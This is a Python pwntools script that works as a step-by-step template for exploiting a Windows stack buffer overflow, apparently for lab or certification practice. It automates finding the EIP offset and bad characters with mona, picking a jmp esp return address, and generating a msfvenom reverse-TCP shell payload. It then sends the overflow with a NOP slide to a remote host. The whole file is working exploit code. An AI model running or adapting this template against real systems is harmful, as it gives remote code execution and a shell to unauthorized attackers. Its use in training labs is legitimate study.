#!/usr/bin/env python

from pwn import *
import subprocess

context.update(arch="i386", os="windows")

# General
# 1. Open Immunity Debugger as Administrator
# 2. File -> Open -> bof-exe
# 3. Click red play button
#
# (Un)comment the needed function

# 1. Set global settings
rhost = "so.me.i.p"
rport = 9999
prefix = b""  # can be empty
postfix = b""

# 2. find offset
def find_offset(start, step):
    r = remote(rhost, rport)
    i = start
    pattern = None
    while True:
        pattern = cyclic(i)
        try:
            r.send(prefix + pattern)
            # r.send(prefix + pattern + r.newline)
            # output = r.recvline()
            print("After send")
            i += step
            if not r.can_recv(1):
                r.close()
            else:
                # output = r.recvline()
                output = r.recvuntil(timeout=1)
                # print(output)
        except:
            print(f"Payload (len = {i}): {prefix + pattern}")
            break

    print(
        "\nType in the eip (left to right) which is shown in mona (the order will be automaticly swapped):"
    )
    mona_offset = input()[:-1]
    flat_offset = flat(int(mona_offset, 16))
    print(f"\nYour input was {mona_offset} which is {flat_offset} in ascii")
    pattern_offset = pattern.find(flat_offset)
    print(f"Offset is: {pattern_offset}")
    if len(prefix) > 0:
        print(f"Offset (with prefix) is: {pattern_offset + len(prefix)}")


# 3. Save previous offset here
offset = 524
overflow = b"\x41" * offset

# 4. Test offset
def test_offset():
    return_address = b"\x42\x42\x42\x42"  # eip
    exploit = prefix + overflow + return_address

    r = remote(rhost, rport)
    # r.send(exploit)
    r.send(exploit + r.newline)
    r.close()
    print("EIP should now be 42424242. Is this correct?")


# 5. find bad chars
# Set mona working dir: !mona config -set workingfolder c:\windows\tasks
# Switch back to CPU view
def find_badchars():
    print("!mona config -set workingfolder c:\\windows\\tasks")
    eip = b"\x42\x42\x42\x42"
    padding = b"\x41" * offset

    all_chars = [p8(i) for i in range(0, 256)]
    bad_chars = [p8(0)]

    while True:
        filtered_chars = [bd for bd in all_chars if bd not in bad_chars]
        exploit = prefix + padding + eip + flat(filtered_chars)

        r = remote(rhost, rport)
        # r.send(exploit)
        r.send(exploit + r.newline)
        r.close()
        print(f"Current payload: {flat(filtered_chars)}\n")
        print("Check mona for bad chars like so:")
        print("Generate array with chars:")
        print(
            '!mona bytearray -b "'
            + "".join("\\x" + "{:02x}".format(u8(x)) for x in bad_chars)
            + '"'
        )
        print("Compare stack (address is normal so left to right):")
        print("!mona compare -f C:\\windows\\tasks\\bytearray.bin -a <esp-address>")
        print(
            "If there are no difference type 'stop', for a rerun type 'continue' everything else will be interpreted as chars that will be added to the bad chars list (ex: 07)"
        )
        ite_input = input().strip()
        if ite_input == "continue":
            print("Restart application then press return...")
            input()
        elif ite_input == "stop":
            print("Final bad chars array:")
            print(
                "bad_chars = ["
                + "".join(f"p8({u8(x)}), " for x in bad_chars)[:-2]
                + "]"
            )
            print("Now edit the template!")
            break
        else:
            ite_input_con = p8(int(ite_input, 16))
            bad_chars.append(ite_input_con)
            print(f"Input converted and added to bad_chars array:")
            print("".join("\\x" + "{:02x}".format(u8(x)) for x in bad_chars))
            print("Restart application then press return...")
            input()


bad_chars = [p8(0)]

# 6. Find jump point
def find_jumppoint():
    print("Find jump point:")
    print(
        f'!mona jmp -r esp -cpb "'
        + "".join("\\x" + "{:02x}".format(u8(x)) for x in bad_chars)
        + '"'
    )
    print('Check "Log data" window, then modify template')


# 7. Set return address
return_address = flat(
    int("311712f3", 16)
)  # type address normal (from left to right) it doesnt matter if you type leading "0x"

# 8. Generate payload
def generate_payload():
    # print("Run the following command:")
    command = (
        'msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=5555 -b "'
        + "".join("\\x" + "{:02x}".format(u8(x)) for x in bad_chars)
        + '" -f c | grep -iE ".\\x"'
    )
    output = subprocess.check_output(command, shell=True, text=True)
    # print(rev_shell)
    print("\nYour reverse shell code:")
    print('payload = b""')
    print(output.replace('"\\', 'payload += b"\\').replace(";", ""))
    print("Copy that into the script")


# 9. Nop slide
nops = p8(0x90) * 16

# 10. Shellcode
# Paste below here


# 11. Exploit
def exploit():
    exploit = prefix + overflow + return_address + nops + payload + postfix
    r = remote(rhost, rport)
    # r.send(exploit)
    r.send(exploit + r.newline)
    r.close()


find_offset(1000, 100)
# test_offset()
# find_badchars()
# find_jumppoint()
# generate_payload()
# exploit()
